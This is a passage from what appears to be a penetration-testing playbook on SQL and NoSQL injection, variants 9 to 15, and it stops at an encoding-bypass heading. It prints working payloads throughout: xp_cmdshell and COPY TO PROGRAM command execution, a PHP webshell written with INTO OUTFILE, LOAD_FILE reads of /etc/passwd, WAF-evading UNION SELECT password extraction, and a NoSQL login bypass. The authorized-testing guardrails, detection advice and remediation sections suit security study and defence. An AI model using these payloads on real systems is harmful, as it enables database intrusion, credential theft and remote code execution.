# sqli-testing — Variants 9-15 (references/variants-2.md)

Deep playbook, second half: structural manipulation, DB-specific command execution,
WAF impedance mismatch, polyglot evasion, NoSQLi, truncation, and second-order blind
extraction. Cross-cutting notes (headers, encodings, logical operators, obfuscation,
blind OOB HTTP/SMB) are collected at the end of this file; encoder tables and tool
templates live in `payloads.md`. Same guardrail as everywhere: read-only proofs,
never destructive or DoS-shaped payloads against third-party targets.

## Table of contents

- [V-09: Structural query manipulation via ORDER BY, GROUP BY and LIMIT/OFFSET exploits](#v-09-structural-query-manipulation-via-order-by-group-by-and-limitoffset-exploits)
- [V-10: Database-specific command execution](#v-10-database-specific-command-execution-mysql-into outfileload_file-mssql-xp_cmdshell-postgresql-copy-tofrom-program-oracle-utl_httpsysdbsqlite)
- [V-11: WAF impedance mismatch via inline comment obfuscation and whitespace bypass](#v-11-waf-impedance-mismatch-via-inline-comment-obfuscation-and-whitespace-bypass-techniques)
- [V-12: Automated time-delay evasion via polyglot SQLi execution blocks](#v-12-automated-time-delay-evasion-via-polyglot-sqli-execution-blocks)
- [V-13: NoSQL injection (NoSQLi) document extraction via operator substitution](#v-13-nosql-injection-nosqli-document-extraction-via-operator-substitution)
- [V-14: Truncation-based SQL injection via database field length limits](#v-14-truncation-based-sql-injection-via-database-field-length-limits)
- [V-15: Second-order blind inferential character-by-character verification extraction](#v-15-second-order-blind-inferential-character-by-character-verification-extraction)
- [Cross-cutting notes](#cross-cutting-notes)

---

## V-09: Structural query manipulation via ORDER BY, GROUP BY and LIMIT/OFFSET exploits

**Mechanism:** The attacker controls *query structure*, not just values: the sort
column, grouping key, page size, and offset. These slots take identifiers/literals
rather than bound parameters — apps build `ORDER BY ${col} ${dir}` from request
input — so injection lands where no quote-breakout is even needed (numeric/identifier
context), and `CASE WHEN`-based conditional sorting gives a blind oracle without
ever showing data. The violated assumption: "ORDER BY only reorders rows, so it's
harmless."

**Preconditions:**
- Request exposes sort/filter/pagination params (`sort`, `order`, `order_by`, `dir`, `limit`, `offset`, `page`, `size`, `groupBy`, sometimes nested like `sort[field]`).
- Values interpolated into the SQL string (allow-listed enums are safe; string-built is not).
- For blind use: the response shows row order/page content stable enough to compare.

**Detect:**
1. Probe `ORDER BY` position with column count: `sort=id` → `sort=zzz` → `sort=id,random()`... errors or 500s on `zzz` mean the identifier reaches SQL unquoted.
2. Confirm identifier injection: `sort=id AND (SELECT 1)=1` vs `sort=id AND (SELECT 1)=2` (numeric/`AND` forms), or in a quoted identifier context `' OR '1'='1`.
3. Conditional-sort oracle (the powerful one): MySQL
   `sort=(CASE WHEN (ASCII(SUBSTR((SELECT ...),1,1))=97) THEN id ELSE email END)` —
   watch which column the rows sort by. Postgres/MSSQL allow `ORDER BY CASE WHEN`.
4. Group/HAVING: `groupBy=<col>` → try `groupBy=col HAVING 1=1-- ` or
   `groupBy=col,version()`; column-count errors leak group shape.
5. LIMIT/OFFSET numeric slot: `limit=1` → `limit=1;SELECT ...` (V-06), `limit=IF(1=1,1,0)`, or MySQL `limit 1 PROCEDURE ANALYSE()`-style legacy tricks; offset pagination abuse
   (`offset=-1`) is more BAC — report it to `bac-idor-testing` if it exposes others' rows.

**Proof of concept:**
- Identifier error probe: `GET /api/products?sort=<PLACEHOLDER>` with `sort=zzz`, `sort=id DESC`, `sort=id,(SELECT 1)`.
- Conditional sort (MySQL): `sort=(CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE id=1),1,1))=97) THEN name ELSE category END)`
- Blind via page contents: `sort=id AND IF(ASCII(SUBSTR(<subquery>,1,1))=97,1,(SELECT 1 UNION SELECT 2))` (row-vs-error flip is a second oracle shape).
- LIMIT stack (only if V-06 applies, read-only second statement): `limit=1;SELECT CASE WHEN <cond> THEN SLEEP(2) ELSE 0 END-- `.

**Confirm:** Structure-driven A/B: same request, only the sort/limit token changes →
observable reordering, pagination shift, or error that tracks the token's truth.
Second signal: a `CASE WHEN` sort whose ordering matches an *independently known*
ground truth (you know row A > row B), proving the comparison executed.

**False positives:** Client-side sorting (JS re-sorts the table — check the raw API
response, not the rendered grid); stable ordering that's just `ORDER BY id` default
appearing "controlled"; errors from unknown identifiers that are really app-side
enum validation (validation error ≠ SQL error — read the error class); pagination
counters changing length so "boolean flips" are just off-by-one display; and
`LIMIT`/`OFFSET` params being validated as ints — a 400 there is not a finding.
Also: `random()`/`newid()` sorts make *every* comparison look non-deterministic —
retest with a deterministic tiebreaker before claiming an oracle.

**Impact:** Identifier-context injection often bypasses WAFs tuned for quote
breakouts (V-11 synergy); conditional sorting yields a silent data oracle; LIMIT
control can expose hidden pages. Report which structural slot + which oracle.

**Remediation:** Allow-list sort columns and sort directions server-side (map API
names → fixed SQL identifiers); cast `limit`/`offset` to int; never interpolate
identifiers from request data.

**CWE / OWASP:** CWE-89 (+ CWE-639 adjacency for offset paging) — OWASP A03:2021; WSTG-INP-04.

---

## V-10: Database-specific command execution (MySQL INTO OUTFILE/LOAD_FILE, MSSQL xp_cmdshell, PostgreSQL COPY TO/FROM PROGRAM, Oracle UTL_HTTP/SYS.DBMS, SQLite)

**Mechanism:** Each DBMS ships file/shell-adjacent primitives the app's DB role may
be allowed to reach — and SQL injection is the delivery vehicle. MySQL
`SELECT ... INTO OUTFILE`/`LOAD_FILE`; MSSQL `xp_cmdshell`, `sp_configure`,
`OPENROWSET`, `CLR`; Postgres `COPY ... TO/FROM PROGRAM`, `lo_import`, `dblink`;
Oracle `UTL_HTTP`, `DBMS_SCHEDULER`, `SYS.DBMS_*`, external tables; SQLite
`load_extension`, attach-based file read/write. The violated assumption: "the app
user is least-privilege" — shared-hosting DBs and default installs often are not.
This is the SQLi→RCE/file bridge, so it overlaps `rce-testing`.

**Preconditions:**
- Fingerprinted DBMS (V-01) + known privileges (MySQL `FILE`, MSSQL sysadmin, Postgres superuser/`pg_execute_server_program`, Oracle `CREATE JOB`/network packages).
- Writable web-reachable path known for the outfile→shell step (upload dir, `/var/www/html` guesses) — *in authorized labs only* for the write proof.
- Stacked queries (V-06) for statements that must run as their own command; some primitives work inline in a `SELECT`.

**Detect:**
1. Fingerprint + privilege read first (read-only): MySQL `SELECT file_priv FROM mysql.user WHERE user=current_user()` — or simply test `LOAD_FILE('/etc/passwd')` *only if the program permits file reads*; otherwise use `LOAD_FILE` on a file you own/know. Postgres `SELECT current_setting('is_superuser')`. MSSQL `SELECT is_srvrolemember('sysadmin')`.
2. File-read capability check (safe shape): MySQL `' AND LOAD_FILE(CONCAT(CHAR(47),...))-- ` or read a known app file (`composer.json`, `package.json`) — content you can verify = real capability.
3. Command channel check (no destructive effect): MSSQL `' AND 1=(SELECT TOP 1 1 FROM OPENROWSET('SQLNCLI','server=(local)', 'EXEC master..xp_cmdshell ''whoami'''))-- ` shape, or via stacked `'; EXEC master..xp_cmdshell 'whoami'-- `; Postgres `COPY (SELECT 1) TO PROGRAM 'id'`-shaped *read-only* command; Oracle `UTL_HTTP.REQUEST('http://<your-oast>')`.
4. Never probe with `rm`, `format`, `del`, fork bombs, or heavy loops. `whoami`, `id`, `hostname` only — capability proof, zero impact.
5. Where a primitive writes files, defer the write proof to your own lab/instance; on bounty targets prove reachability (privilege + path writable errors) without dropping a shell.

**Proof of concept (read-only / lab-write):**
- MySQL read: `' UNION SELECT LOAD_FILE('/var/www/html/composer.json')-- ` (needs `FILE` + `secure_file_priv` check); outfile (lab): `' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/upload/x.php'` — lab only, note the guardrail in your notes.
- MSSQL: `'; EXEC master..xp_cmdshell 'whoami'-- `; then `sp_configure 'xp_cmdshell',1` only if already enabled — *never* `RECONFIGURE`-flip features on third-party targets beyond what's needed to observe the state; report the config state instead.
- Postgres: `'; COPY (SELECT 1) TO PROGRAM 'id'-- ` (superuser-only); file path:
  `COPY users TO '/tmp/out.csv'` → lab only.
- Oracle: `' AND UTL_HTTP.REQUEST('http://<nonce>.<your-oast>.com/') IS NOT NULL-- ` (network proof, no write) or `DBMS_SCHEDULER` job creation → lab only.
- SQLite: `'; ATTACH DATABASE '/tmp/x.db' AS p;-- ` (lab file write) / `load_extension` on a crafted `.so` → lab only.

**Confirm:** Capability, not destruction: (a) a *read* primitive returns verifiable
file content or env data, or (b) a command returns `whoami`/`id` of the service
account, correlated with your request (OAST nonce for Oracle/HTTP paths), 3/3 runs.
Second signal: privilege query (`is_srvrolemember`, `file_priv`, `is_superuser`)
agreeing with the observed capability. No files left behind on third-party targets.

**False positives:** `LOAD_FILE` returning `NULL` (not errors) means blocked —
`NULL` is *not* a file read; `INTO OUTFILE` failing on path/permission errors proves
*attempt*, not capability — report as "restricted"; `xp_cmdshell` returning the
command's error text because it's *disabled* (the error says so) — that's a
hardening observation, not RCE; `whoami` output matching your *own* machine because
the callback came from your client (confirm source is the DB host); and `COPY
PROGRAM` requiring superuser — a plain error means you lack privilege, don't push.
Juniors also confuse OAST *network* proof (V-05) with command execution proof — keep
them separate in the report.

**Impact:** Highest-severity class: file read → config/credential theft
(chain `info-disclosure-testing` for `.env`), file write → webshell (RCE — chain
`rce-testing`), shell → pivot. Severity depends on DB privileges + path
exposure; state auth level and exact privilege in Impact; always note read-only
proof was used.

**Remediation:** Least-privilege DB accounts (no `FILE`/sysadmin/superuser for app
users), disable `xp_cmdshell`/`COPY PROGRAM`/network packages at the server,
parameterize queries (the delivery vector), web-root outside DB write paths.

**CWE / OWASP:** CWE-89, CWE-250/CWE-269 (privilege), CWE-78 adjacency — OWASP A03:2021 + A05:2021 Misconfiguration; WSTG-INP-04.

---

## V-11: WAF impedance mismatch via inline comment obfuscation and whitespace bypass techniques

**Mechanism:** The WAF pattern-matches the *raw* request text while the DBMS
*parses* it — different grammars, different acceptance. Inline comments
(`/**/`, `/*!50000...*/` MySQL versioned), whitespace alternatives (tab, newline,
`%09`, `/**/`, parentheses, `+` in POST bodies), backtick/slash tricks, and
comment-joined tokens (`UNION/**/SELECT`) let payload semantics survive while the
signature breaks. The violated assumption: "blocked payload = not injectable" —
only that *serialization* of it is.

**Preconditions:**
- WAF/IPS present (block page, 403 with signature name, request-time delta) — fingerprint it first (`Server`/`X-CDN` headers, block-page HTML).
- Injected value reaches SQL after any *decoded* normalization (double-decode mismatch — see encoding notes below).
- The DBMS accepts the obfuscated form (test locally against the fingerprinted engine).

**Detect:**
1. Establish the block baseline: send a naked `UNION SELECT`, note status/body/time (some WAFs *delay* instead of blocking — timing itself is a channel).
2. Binary-search which token trips it: test `UNION`, `SELECT`, `SLEEP`, `'` separately → map the signature set.
3. Re-encode the offending token only: `UNION/**/SELECT`, `UN/**/ION SEL/**/ECT`, `UNION%0aSELECT`, `UNION%09SELECT`, `/*!UNION*//*!SELECT*/`, `UN%49ON` (hex-ish via `%49`=I... use where allowed), `UNI%4fN` etc.
4. Whitespace ladder: space → tab → newline → `/**/` → newline+comment → paren-adjacent (`IF(...)` needs no space before `(`).
5. Case + logical-operator ladder (see cross-cutting notes): `SeLeCt`, `||`, `&&`, `!`, `%7c` (`|`), `%26` (`&`).
6. Confirm the *payload semantics* still execute at the DBMS (boolean flip or timing per V-03/V-04) — a WAF that passes garbage and a DB that ignores it is not a bypass.

**Proof of concept:**
- Comment-joined: `1'%2f**%2fUNION%2f**%2fSELECT%2f**%2fNULL,password%2f**%2fFROM%2f**%2fusers--%20`
- Versioned comment (MySQL): `1'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- `
- Whitespace-free: `1'OR(1=1)-- ` / `1'AND(ASCII(SUBSTR((SELECT%09user),1,1)))97-- ` (tab inside function args).
- Encoded quote: `%2527` (double-encoded), `%27`, `''` (SQL quote-doubling), Unicode `＇` (U+FF07) where the app normalizes fullwidth → ASCII (note: MySQL doesn't natively fold it — confirm normalization exists).
- Split-argument: `1'UNI%0bON SEL%0dECT...` (vertical tab/CR may pass both WAF and MySQL `UNION`).

**Confirm:** Same effect achieved by the obfuscated payload *and* the clean payload
when the WAF is bypassed (or from a different egress/tester IP that the WAF treats
differently). The delta "clean = 403, obfuscated = oracle flips" is the second
signal. Log both request variants as evidence.

**False positives:** WAF 403 re-attacks (rate limits making everything look
blocked) — **and the discriminator is the benign control: if a *harmless* value
(`A01WX` next to a baseline `A01W` that returned 200) also 403s, the block is
behavioural (bot score/rate), not payload-triggered, so your "injection was blocked"
reading is wrong. Akamai Bot Manager does exactly this — ~1–2 requests pass per burst,
then *everything* 403s at the edge in <0.3s regardless of input; cool-down ~30–45s
restores it. Space probes ≥35s instead of concluding the WAF saw your payload.** Also
**never read a CDN-cached error page as a backend/DB error**: a `503` carrying branded
maintenance text may be `server: AkamaiNetStorage` + `server-timing: cdn-cache; HIT` —
an edge-cached page unrelated to your payload, so the "quote caused a 503" inference is
pure noise. Check `cdn-cache`/`Server` before crediting the injection; only an *uncached*
app-origin error (`server-timing: origin; dur=…`, no `cdn-cache: HIT`) counts as a signal.
Challenges (JS/TLS fingerprinting) mistaken for injection blocks;
"bypass" payloads that return 200 because they were *ignored* (no injection —
compare against the boolean truth-flip, V-03 FP section); case variations that
MySQL accepts but the WAF *also* accepts (no net bypass — test, don't assume);
`/**/` inside a string literal being consumed as data not syntax; and encoding
bypasses undone by the app decoding *twice* (then your `%2527` never reaches SQL
as a quote). Juniors credit the WAF with blocking something that was actually
app-side validation — read the block source.

**Impact:** Reachability of otherwise-blocked sinks — elevates a "WAF is blocking
it" lead into a real finding; report WAF name + bypass serialization + oracle
proof; remediation must not be "the WAF will catch it."

**Remediation:** Parameterize (WAF as defense-in-depth only); normalize/validate
once, canonically, before query building; WAF rules on *decoded* values.

**CWE / OWASP:** CWE-89 (+ CWE-184 Incomplete Denylist) — OWASP A03:2021; WSTG-ERR-04/ WSTG-TECH "WAF fingerprinting" adjacency.

---

## V-12: Automated time-delay evasion via polyglot SQLi execution blocks

**Mechanism:** Signature filters accept only payloads that look like *several
grammars at once* — SQL valid across engines *and* shell/comment/JS contexts — or
they accept payloads whose delay expression is wrapped in a polyglot block that
parses as harmless text to the filter but evaluates at the DBMS. Techniques:
multi-engine delay wrappers (`CASE WHEN` + coalesce of engine-specific sleeps
guarded by `IF(...,SLEEP(1),0)` that degrades gracefully), ternary/comment polyglots
(`'/**/OR/**/'1'='1'/**/`), quote-balance polyglots (payload valid with or without
a surrounding quote: `OR 1=1-- ` and `' OR '1'='1`), and payload shapes where the
*only* observable effect is time — so content filters that only score response
bodies miss it. The violated assumption: "the filter sees what the DB evaluates."

**Preconditions:**
- Time-based channel is the surviving oracle (V-04 prerequisites apply).
- Filter/WAF accepts or partially passes the polyglot; some payloads are engineered so *both* parse paths are valid.
- Automated tooling (sqlmap tamper scripts) in play — the variant is about *generating/rolling* polyglots systematically.

**Detect:**
1. Run the V-04 differential first — polyglot evasion is pointless if plain timing already works.
2. Build a polyglot delay wrapper and test each engine path *individually* in your lab: MySQL `IF(<cond>,SLEEP(2),0)`, MSSQL `IF(<cond>) WAITFOR DELAY '0:0:2'`, Postgres `(CASE WHEN <cond> THEN pg_sleep(2) END)`, Oracle `DBMS_PIPE.RECEIVE_MESSAGE` — a true polyglot carries several, neutralized by comment guards: e.g.
   `' OR IF(<cond>,SLEEP(2),0)-- ` for MySQL and
   `' OR 1=CASE WHEN <cond> THEN ... END-- ` for ANSI-ish engines.
3. Probe quote-balance polyglots: `1 OR 1=1-- ` (numeric, unquoted) and `1' OR '1'='1` (string) — a param may accept only one shape; test both without assuming.
4. Comment-polyglot: `1'/**/OR/**/1=1-- ` vs `1' OR 1=1-- ` — if only the comment form passes the filter, note which serializer was in play (V-11 overlap).
5. Escalate: data-bearing condition inside the polyglot delay
   (`IF(ASCII(SUBSTR((SELECT ...),1,1))=97,SLEEP(2),0)`) — proves the block is an
   *executing* injection, not a slow filter.

**Proof of concept:**
- Quote-balance polyglot: `<BASELINE> OR 1=1-- ` and `'<BASELINE>' OR '1'='1'-- ` (same param, two shapes).
- Multi-engine conditional delay (MySQL-first):
  `' OR IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>108,SLEEP(2),0)-- `
- Comment-wrapped: `'/**/OR/**/IF(1=1,SLEEP(2),0)--%20`
- sqlmap tamper-style polyglot (see `payloads.md` §3): `--tamper=comment,between,randomcase` with `--technique=T`.

**Confirm:** Differential timing (V-04 method) on the polyglot: true branch ≫ false
branch, 3/3, same shape — plus a second signal from a *differently-shaped* payload
family (boolean flip if any body channel exists, or OOB callback per V-05). Report
both shapes.

**False positives:** The filter's own latency inflating *both* branches (scan cost —
compare true vs false of identical shape, never payload vs baseline alone);
polyglots that are valid in *neither* engine so the DB errors slowly; MySQL
`IF(cond,SLEEP(2),0)` where `cond` errors → error path *without* sleep → false
negative read as "WAF blocked"; `WAITFOR DELAY` inside an `IF` needing a statement
context (not an expression) — juniors jam it into `SELECT` and misread the failure;
and claiming "polyglot bypass" when the payload only ever worked on the lab engine,
not the target's. Also: a *random* 2-3s delay is not your oracle — control branch.

**Impact:** Sustained blind exfiltration under an active filter; report which
polyglot shape + timing table; severity same as V-04 but with the extra note that
defenses (WAF signatures) were bypassed — often a separate WAF-bypass finding.

**Remediation:** Parameterize (kills all shapes at once); run WAF rules on decoded
canonically-normalized payloads; alert on conditional-latency patterns regardless
of payload shape.

**CWE / OWASP:** CWE-89, CWE-184 — OWASP A03:2021; WSTG-INP-04.

---

## V-13: NoSQL injection (NoSQLi) document extraction via operator substitution ($gt, $ne, $regex) including HTTP-parameter/JSON-operator injection

**Mechanism:** Document stores (MongoDB via Mongoose/express-mongo, DynamoDB
filters, CouchDB/Pouch, Firestore-ish query builders) accept *structured operators*
as query values. If the app forwards request fields into a filter without
type-checking, the attacker replaces a scalar with an operator object —
`{"username": {"$ne": ""}}`, `{"password": {"$regex": "^a"}}` — turning equality
into logic: authentication bypass, filter bypass, and *regex-based blind extraction*
(one `^ab` probe per char). HTTP form params make this worse: `username[$ne]=` is
parsed by qs/php into `{"username": {"$ne": ""}}` with no JSON body at all. The
violated assumption: "the value is a string because the form said so."

**Preconditions:**
- Backend is a document store (or an ORM that maps dicts → query operators), reachable via JSON body, form params with bracket syntax, GraphQL input, or query-string `$`-keys.
- App passes request values into `$find`/filter without `typeof === 'string'` checks.
- For extraction: a comparator operator (`$regex`, `$gt`, `$lt`) can be pointed at stored fields of *your own* record (guardrail: extract only data you own or aggregate proof like "a user with role admin exists").

**Detect:**
1. Fingerprint: responses shaped like Mongo docs (`_id`, `$oid`), `ObjectId(...)` strings, errors (`CastError`, Mongo `BSONError`, `E11000`), or a `mongodb://` string in verbose errors. Dynamo: `FilterExpression`/`ScanIndexFamilies` errors.
2. Scalar → operator swap: baseline `{"user":"admin","pass":"secret"}` → `{"user":"admin","pass":{"$ne":""}}`. Login/result-set *change* (200 vs 401, rows appear) = operator reaches the filter.
3. Type swap: `{"id": 1}` → `{"id": {"$gt": 0}}` → `{"id": ["1","2"]}` (array) — different reactions reveal the coercion layer.
4. HTTP-parameter variant (no JSON): `POST user=admin&pass[$ne]=` or `?id[$gte]=1` (qs in Express; PHP `$_GET` bracket parsing). Also try `id[$regex]=^1`.
5. Blind extraction ladder: `{"name":{"$regex":"^a"}}` → flip `$regex` value while watching result counts; `^`-prefix per character (V-03 logic, document syntax).
6. Injections *inside* stored strings for second-order NoSQLi (rare, JS-eval contexts → that's `rce-testing`/CSTI territory — don't conflate).

**Proof of concept:**
- Auth bypass: `POST /login` `{"username": "admin", "password": {"$ne": ""}}` → `<PLACEHOLDER: success signal — 302/200 with session>`
- Blind extraction (own record or aggregate proof):
  `{"username": {"$regex": "^adm"}}` vs `{"username": {"$regex": "^adX"}}`
- Form-param form: `username=admin&password[$ne]=1` (`Content-Type: application/x-www-form-urlencoded`, qs-parsed).
- Projection abuse (Mongo `$where`-adjacent only if reachable): `{"$where": "this.password.match(/^a/)"}` → JS engine → high impact, chain note to `rce-testing`.
- ReDoS note: heavy `$regex` against large collections can DoS the DB — use tiny anchored patterns, never nested quantifiers on third-party targets.

**Confirm:** Two signals: (a) operator flip changes the response while the *scalar
equivalent* doesn't (i.e. `{"$ne":""}` ≠ `{"pass":"whatever"}` behavior), and
(b) ground-truth match — `$regex` ladder reproduces a value you already know (your
own username's first char), 3/3. If auth-bypass: confirm you can do *only* what
your session proves, no data beyond scope.

**False positives:** Express `qs`/PHP bracket parsing *failing* and the app
defaulting to "empty filter" → everything returns rows → looks like `$ne` worked
when no operator was even parsed (check with a *malformed* operator like
`{$unknown:1}` — if it also returns rows, the filter was dropped, not injected);
frameworks that stringify `{"$ne":""}` to `[object Object]` and compare literally
(that's a type error, not a bypass); login returning 200 with an error body on
*both* branches (compare actual session issuance, not status code); DynamoDB
`$ne` simply not existing (it's Mongo syntax — Dynamo uses `<>`/`NE`) so a "no
change" ≠ blocked; and rate-limit/CSRF noise on result counts (V-03 FP rules apply).
Also: `$regex` matching across *many* documents and returning the same count for
both probes → your probe hit a non-unique field; test uniqueness first.

**Impact:** Auth bypass (session you shouldn't have — report severity by role
reached), blind read of stored documents (emails, tokens — own/aggregate only for
proof), enumeration of whether an admin account exists (`$regex` on usernames).
Report operator used + auth level; CWE differs from SQLi — keep it in the NoSQL
line.

**Remediation:** Type-check every filter value (`typeof === 'string'` + length cap)
before building queries; strip `$`-prefixed keys server-side (deny-list of
operators) or map explicit DTO fields; parameterize/whitelist document queries.

**CWE / OWASP:** CWE-943 (Improper Neutralization of Special Elements in Data Query
Logic) — OWASP A03:2021; WSTG-ATH-*(NoSQL auth bypass)/WSTG-INP-04.

---

## V-14: Truncation-based SQL injection via database field length limits

**Mechanism:** A column (or input buffer) accepts N characters and silently
*truncates* the (N+1)th — in MySQL non-strict mode with `CHAR(n)`, the trailing
`' -- ` comment is cut off while the quote *before* it stays, leaving live SQL
syntax... no wait, the exploit direction: the app validates the *whole* input
(password policy: contains `--`? rejected) but the DB stores only the first N chars,
so a payload like `<N chars>'--` survives truncation with the trailing comment
*stripped or kept* depending on where the cut lands. Classic cases: a username
validated to max 32 chars, `VARCHAR(32)` truncating `admin'+payload...`, and
registration where `user='aaaa...(pad)' OR 1=1--` is cut so the stored value
becomes a syntactically live injection when later concatenated (feeds V-07/V-15).
The violated assumption: "length limits are a safety control."

**Preconditions:**
- A field with a hard length cap: DB column (`CHAR(n)`/`VARCHAR(n)`) or app input limit *smaller than* the validation/boundary logic accounts for.
- Silent truncation (MySQL non-strict `sql_mode`, some ORMs) rather than an error.
- A place where the truncated value is *re-used in SQL* (second-order) or where the truncation defeats a boundary check (e.g. strips a trailing quote/comment, or cuts a `>= min length` validator while keeping an injected prefix).

**Detect:**
1. Map the boundary: send inputs of length n-1, n, n+1 to the field; observe accept/reject/echo. Note where the *stored* value (not the response echo) differs from what you sent — read it back from a display page (V-07 setup).
2. Probe for silent truncation: store a 40-char marker in a 32-char field, then fetch the row (profile view, admin list, export) — marker cut at 32 with no error = silent truncation.
3. Craft the cut: put the payload so the *dangerous* characters land inside the kept window and the disallowed/trailing characters land outside — e.g. field limit 32: `' OR '1'='1` padded to exactly the boundary so whatever follows is discarded.
4. Check `sql_mode` indirectly: MySQL errors on strict truncation (`Data too long`) → not this variant; silent accept → candidate.
5. Chain check: does the stored (truncated) value get concatenated into a later query (V-07/V-15)? That's where truncation becomes injection.

**Proof of concept:**
- Boundary map: `POST /register` with `username` length 31/32/33 (`<PLACEHOLDER: field, limit>`) → observe stored echo.
- Truncation-viable payload (limit 32 example):
  `username = "' OR '1'='1'-- ` padded so cut occurs after the comment marker, or the inverse: pad so the *validator-visible* tail differs from the *stored* head.
- Validation-defeat (policy "no quotes"): quote accepted because... (this needs the *opposite* trick: put forbidden chars past the limit? validators run pre-truncation — so instead ensure DB-side truncation removes the *sanitizer's* appended guard, e.g. app appends `-- safe` marker then truncates the marker away — document the actual observed behavior).
- Second-order: store `aaa...(exact limit)` ending mid-string so the next query sees an unterminated quote → then trigger the consumer (V-07 steps).

**Confirm:** Two-part proof: (a) stored value ≠ sent value, cut exactly at the known
limit (read-back evidence), and (b) the *truncated* form changes query behavior at
the consumer (boolean flip / error / delay that does *not* occur with the untruncated
input). That "only the truncated version fires" A/B is the second signal.

**False positives:** Normal length validation rejecting n+1 (that's validation
working, not truncation — you need the value to be *stored cut*); client-side
max-length silently stopping input (check the raw request actually sent n+1);
response echo truncating for *display* while the DB stored the full string (display
limits ≠ DB limits — read back from an independent surface); MySQL strict-mode
errors misread as "boundary injection"; and second-order breakage caused by a
sanitizer mid-string cut rather than SQL (V-07 FP rules: confirm SQL-shaped
effect). Juniors also cut at the wrong byte — test the exact limit with a ruler
pattern (`0123456789...`).

**Impact:** Converts strict inputs (length caps, "sanitized" fields) into injection
sinks; often lands in second-order/admin paths (V-07 chain) so it can be high
severity; report the exact limit, cut position, and the consumer query's behavior.

**Remediation:** Enforce limits *consistently* (validate and reject, never silently
truncate) and parameterize the consuming query — truncation stops being a security
concern once values are bound as data.

**CWE / OWASP:** CWE-89 (via CWE-170/CWE-128-style truncation) — OWASP A03:2021; WSTG-INP-04.

---

## V-15: Second-order blind inferential character-by-character verification extraction

**Mechanism:** The full pipeline: a payload is stored second-order (V-07 write
half), *and* the read-out is blind (V-03/V-04 inference, no reflected data), *and*
the unit of extraction is a per-character verification — the attacker plants a
condition in the stored field so the consumer's behavior (row visible vs hidden,
delay vs no delay) verifies one character of a *target* value at a time. It is the
slowest, most patient variant and the hardest to detect, because each individual
request looks like a normal page load by an innocent user — the SQL only ever
executes in the *other* request path (the consumer), detached from the attacker's
probe session. The violated assumption: "monitoring the write API catches
injection" — the malicious bytes are inert on arrival.

**Preconditions:**
- Stored field consumed by a query that concatenates (V-07 preconditions).
- Blind channels only: consumer shows no injected data directly (admin list with boolean effect, or a background report where only timing is visible).
- Patience + budget: ~7 requests per character *per consumer trigger* — plan request counts, sleep between bursts (DoS guardrail), and use binary search on ASCII not linear scans.
- Prefer own/aggregate data for proof (read-only guardrail).

**Detect:**
1. Confirm the V-07 pipeline first (stored quote breaks the consumer) — without a working consumer, this variant doesn't exist.
2. Confirm the consumer gives a *boolean or timing* observable: store a condition that makes your row disappear from a list you can view (`displayName = "' AND '1'='2'-- "` → your row vanishes), or store a conditional delay and trigger the consumer (V-04 method, measured on trigger).
3. Verify the delay/flip is consumer-triggered: sending the *stored payload* directly at the consumer as a *reflected* parameter must NOT reproduce it (else it's first-order, V-03).
4. Start extraction with a known ground-truth string (your own display name) — if the oracle recovers it byte-for-byte, the channel is real.
5. Then extract the target: `IF(ASCII(SUBSTR((SELECT ...),<offset>,1))=<code>,<visible-behavior>,<other>)` planted per probe, consumer triggered per probe.

**Proof of concept:**
- Plant (write, via parameterized INSERT): `PUT /api/profile {"displayName": "' OR IF(ASCII(SUBSTR((SELECT email FROM users WHERE id=1),1,1))=97,'1','0')='1'-- "}`
  (shape adapted so the consumer's row-set depends on the condition — concrete
  consumer: admin list `WHERE display_name='<stored>' OR '<stored>'='...'`.)
- Simpler boolean plant: `"' AND (ASCII(SUBSTR((SELECT <target>,<offset>,1))><mid>))-- "` → consumer shows/hides your row.
- Trigger (separate request/session): `GET /admin/users` (or whatever consumer you found) → row present = true bit.
- Timing variant: plant `x' AND IF(<cond>,SLEEP(2),0)-- `; trigger consumer; measure (differential, V-04 rules — the consumer's own load time is your baseline).
- Extract loop: binary search `ASCII` 32-126 → ~7 plant+trigger cycles per char; document request budget in the report.

**Confirm:** Ground-truth recovery: the oracle reproduces a value you already know
(own username/email prefix) exactly, 3/3, then the same method yields the target
value cross-checked by a *different* channel where available (e.g. compare first
chars extracted by timing vs boolean). Also confirm first-order impossibility:
reflected probes don't fire (step 3 above) — that rules out misclassified V-03.

**False positives:** Timing jitter on the consumer (reports are heavy — use the
consumer's own baseline distribution, V-04 FP rules); row visibility changing due
to *other* users' activity in the same list (isolate: compare only *your* row's
presence, or use a scoped consumer with a unique marker); caching of the consumer
page hiding your plant (force fresh sessions, cache-busting, or admin views that
bypass cache); pagination hiding your row (check all pages or filter); truncation
(V-14) mangling your plant so the condition is different from intended (read back
what was stored!); and concurrent profile updates overwriting your plant (re-plant
before each trigger, verify with read-back). The classic misread: the admin list
being *slow* because it is slow, not because of your `SLEEP`.

**Impact:** Stealthiest exfiltration: no data ever crosses the response, each
request looks benign, and the sink often runs with an admin/reporting DB role —
report the full write→trigger loop, per-char request math, and what class of data
became readable; emphasize the monitoring evasion angle (write-path logs show
nothing SQL-shaped firing).

**Remediation:** Parameterize the consumer query (the whole chain dies); validate
stored data at *use* time; alert on repeated profile-write + admin-list access
pairings and conditional-latency in report jobs.

**CWE / OWASP:** CWE-89 (second-order + blind) — OWASP A03:2021; WSTG-INP-04 (+ WSTG-INFO for the second-order data flow).

---

## Cross-cutting notes

Folding the supporting taxonomy into wherever it applies. Full encoder tables, tool
templates, and one-liners are in `payloads.md`.

### Header-based vectors (User-Agent, Referer, Cookie)
Headers routinely flow into SQL **unvalidated and unlogged** — access-log inserters
(`INSERT INTO logs (ua, referer, ip) VALUES ('<ua>', ...)`), analytics tables, and
session middleware querying `WHERE cookie='<sid>'` are the classic sinks (and they
feed second-order V-07 when an admin views the log). Probe *every* header the
variants' preconditions call for, in this order of likelihood: `Cookie` (session
lookup), `User-Agent`/`Referer` (log insertion — trigger the consumer by making the
app re-parse its logs), `X-Forwarded-For` (rate-limit/geo lookups), custom headers
(`X-Request-Id`, `X-Original-URL` reaching WAF-bypass rewrite queries). Same
detection ladder: `'` probe → boolean pair → delay → OOB. Note: header payloads
need encoding (space/`%0a` for raw HTTP/2 constraints), and Burp's Repeater lets
you edit headers directly — don't forget the `Host`-adjacent headers a WAF ignores
but the app parses.

### Encoding bypasses (URL / hex / base64 / unicode, double encoding)
